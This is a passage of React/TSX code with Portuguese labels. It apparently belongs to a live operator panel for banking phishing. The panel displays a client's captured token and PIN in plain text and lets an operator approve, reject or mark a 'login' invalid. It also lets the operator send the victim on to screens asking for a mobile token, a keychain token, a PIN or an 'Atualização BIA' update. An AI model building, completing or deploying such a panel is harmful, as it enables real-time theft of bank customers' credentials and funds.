                  <div className="rounded border border-emerald-500/40 bg-emerald-500/10 px-3 py-2 font-mono text-base tracking-widest text-emerald-300">
                    {atual.token}
                  </div>
                </div>
              )}

              {atual.pin && (
                <div className="space-y-1.5">
                  <div className="font-mono text-[10px] tracking-wider text-muted-foreground uppercase">
                    PIN do cliente
                  </div>
                  <div className="rounded border border-violet-500/40 bg-violet-500/10 px-3 py-2 font-mono text-base tracking-widest text-violet-300">
                    {atual.pin}
                  </div>
                </div>
              )}

              {atual.status === "pendente" ? (
                <div className="space-y-3 border-t border-border pt-4">
                  <div className="space-y-1.5">
                    <div className="font-mono text-[10px] tracking-wider text-muted-foreground uppercase">
                      Próxima tela ao aprovar
                    </div>
                    <div className="grid grid-cols-3 gap-2">
                      {(
                        [
                          { v: "token_celular", label: "Token Cel" },
                          { v: "token_chaveiro", label: "Token Chv" },
                          { v: "pin", label: "PIN" },
                        ] as const
                      ).map((o) => (
                        <button
                          key={o.v}
                          type="button"
                          onClick={() => setProximaTela(o.v)}
                          className={`rounded-md border px-2 py-2 text-xs font-medium transition-colors ${
                            proximaTela === o.v
                              ? "border-primary bg-primary/15 text-foreground"
                              : "border-border bg-background text-muted-foreground hover:text-foreground"
                          }`}
                        >
                          {o.label}
                        </button>
                      ))}
                    </div>
                  </div>
                  <textarea
                    value={motivo}
                    onChange={(e) => setMotivo(e.target.value)}
                    maxLength={400}
                    rows={2}
                    placeholder="Motivo (obrigatório ao reprovar)"
                    className="w-full resize-none rounded-md border border-input bg-background px-3 py-2 text-sm text-foreground outline-none placeholder:text-muted-foreground/60 focus:border-ring"
                  />
                  <div className="flex gap-2">
                    <button
                      disabled={decisao.isPending}
                      onClick={() =>
                        decisao.mutate({
                          id: atual.id,
                          decisao: "aprovado",
                          motivo: motivo.trim() || undefined,
                          proxima_tela: proximaTela,
                        })
                      }
                      className="inline-flex h-9 flex-1 items-center justify-center gap-1.5 rounded-md bg-emerald-500/15 text-sm font-medium text-emerald-400 transition-colors hover:bg-emerald-500/25 disabled:opacity-60"
                    >
                      {decisao.isPending ? (
                        <Loader2 className="size-4 animate-spin" />
                      ) : (
                        <Check className="size-4" />
                      )}
                      Aprovar
                    </button>
                    <button
                      disabled={decisao.isPending}
                      onClick={() => {
                        if (!motivo.trim()) {
                          toast.error("Informe o motivo da reprovação.");
                          return;
                        }
                        decisao.mutate({
                          id: atual.id,
                          decisao: "reprovado",
                          motivo: motivo.trim(),
                        });
                      }}
                      className="inline-flex h-9 flex-1 items-center justify-center gap-1.5 rounded-md bg-destructive/15 text-sm font-medium text-destructive transition-colors hover:bg-destructive/25 disabled:opacity-60"
                    >
                      <X className="size-4" />
                      Reprovar
                    </button>
                  </div>
                  <button
                    type="button"
                    disabled={decisao.isPending}
                    onClick={() =>
                      decisao.mutate({
                        id: atual.id,
                        decisao: "reprovado",
                        motivo: "Login inválido",
                      })
                    }
                    className="inline-flex h-9 w-full items-center justify-center gap-1.5 rounded-md border border-dashed border-rose-400/60 bg-rose-400/10 text-sm font-medium text-rose-300 transition-colors hover:bg-rose-400/20 disabled:opacity-60"
                  >
                    <X className="size-4" />
                    Login inválido
                  </button>
                </div>
              ) : atual.status === "aprovado" ? (
                <div className="space-y-3 border-t border-border pt-4">
                  <div className="text-xs text-muted-foreground">
                    Reencaminhar cliente para outra tela:
                  </div>
                  <div className="grid grid-cols-3 gap-2">
                    {(
                      [
                        { v: "token_celular", label: "Token Cel" },
                        { v: "token_chaveiro", label: "Token Chv" },
                        { v: "pin", label: "PIN" },
                      ] as const
                    ).map((o) => (
                      <button
                        key={o.v}
                        disabled={enviar.isPending}
                        onClick={() =>
                          enviar.mutate({ id: atual.id, proxima_tela: o.v })
                        }
                        className={`rounded-md border px-2 py-2 text-xs font-medium transition-colors disabled:opacity-60 ${
                          atual.proxima_tela === o.v
                            ? "border-primary bg-primary/15 text-foreground"
                            : "border-border bg-background text-muted-foreground hover:text-foreground"
                        }`}
                      >
                        {o.label}
                      </button>
                    ))}
                  </div>
                  <button
                    type="button"
                    disabled={enviar.isPending}
                    onClick={() => enviar.mutate({ id: atual.id, proxima_tela: "interna" })}
                    className={`w-full rounded-md border px-2 py-2 text-xs font-medium transition-colors disabled:opacity-60 ${
                      atual.proxima_tela === "interna"
                        ? "border-sky-400 bg-sky-400/20 text-sky-200"
                        : "border-sky-400/60 bg-sky-400/10 text-sky-300 hover:bg-sky-400/20"
                    }`}
                  >
                    Enviar para Interna (Atualização BIA)
                  </button>
                  <button
                    type="button"
                    disabled={enviar.isPending}
                    onClick={() => enviar.mutate({ id: atual.id, proxima_tela: "sucesso" })}
                    className={`w-full rounded-md border px-2 py-2 text-xs font-medium transition-colors disabled:opacity-60 ${
                      atual.proxima_tela === "sucesso"
                        ? "border-emerald-400 bg-emerald-400/15 text-emerald-300"
                        : "border-emerald-400/50 bg-emerald-400/10 text-emerald-300 hover:bg-emerald-400/20"
                    }`}
                  >
                    Finalizar (enviar para tela de sucesso)
                  </button>
                  {atual.motivo && (
                    <p className="text-xs text-muted-foreground">Motivo: {atual.motivo}</p>
                  )}
                  <p className="text-[11px] text-muted-foreground">
                    Decidido por{" "}
                    <span className="text-foreground">{atual.operador ?? "—"}</span> em{" "}
                    {formatarData(atual.decidido_em)}
                  </p>
                </div>
              ) : (
                <div className="space-y-1 border-t border-border pt-4 text-sm text-muted-foreground">
                  {atual.motivo && <p className="text-foreground">Motivo: {atual.motivo}</p>}
                  <p>
                    Decidido por{" "}
                    <span className="text-foreground">{atual.operador ?? "—"}</span> em{" "}
                    {formatarData(atual.decidido_em)}
                  </p>
                </div>
              )}
            </div>
          )}
        </aside>
      </div>
    </main>
  );
}
